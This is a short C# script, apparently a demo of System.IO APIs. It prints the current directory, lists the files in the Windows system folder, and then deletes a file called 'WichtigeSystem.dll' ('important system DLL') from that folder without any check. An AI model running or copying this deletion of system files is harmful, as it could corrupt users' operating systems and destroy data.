using System;
using System.IO;

var currentDirectory = Directory.GetCurrentDirectory();
Console.WriteLine(currentDirectory);

var files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Windows));

foreach (var file in files)
    Console.WriteLine(file);

var path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "WichtigeSystem.dll");
File.Delete(path);
